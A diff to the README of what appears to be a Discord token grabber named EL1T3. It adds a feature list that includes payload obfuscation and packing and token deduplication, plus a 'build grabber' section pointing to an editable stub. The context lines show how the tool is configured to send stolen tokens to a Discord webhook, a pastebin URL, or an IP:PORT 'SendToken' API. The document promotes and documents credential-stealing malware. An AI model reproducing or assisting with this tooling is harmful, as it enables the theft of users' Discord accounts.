@@ -9,6 +9,14 @@
   <br>
   <img src="https://media.discordapp.net/attachments/813683001496961065/813783642265747516/6869f4cf0c2f7349903668b562c4e403.gif">
 </p>
+<h1 align="center">FEATURE</h1>
+
+- Dynamic url
+- Private Database
+- Remove Duplicate account / token
+- Obfuscate and pack payload
+- Easy to use
+
 <h1 align="center">HOW TO INSTALL</h1>
 
 - **Run** ``./Setup.py`` **file to install modules**
@@ -33,6 +41,19 @@ EL1T3(dynamic_url= False, webhook_url= "https://discord.com/api/webhooks/8161905
 # RAW Url
 EL1T3(dynamic_url= True, webhook_url= "https://pastebin.com/raw/bNcRrQiK", api_url= 'http://IP:PORT/api/SendToken/?Token=TOKEN-HERE')
 ```
+
+#
+
+<h1 align="center">BUILD GRABBER</h1>
+
+- **You can edit the grabber code on ``stub.txt`` file**
+- **Dynamic api url in builder soon**
+
+<img align="center" src="https://media.discordapp.net/attachments/820460842637459460/823377508602085386/unknown.png">
+<img align="center" src="https://media.discordapp.net/attachments/820460842637459460/823377574079234098/unknown.png">
+<img align="center" src="https://media.discordapp.net/attachments/820460842637459460/823378287535194212/unknown.png">
+
+#
 
 <h1 align="center">DATABASE SCREENSHOT</h1>
 <img align="center" src="https://media.discordapp.net/attachments/823351707110473789/823356873637494794/unknown.png">
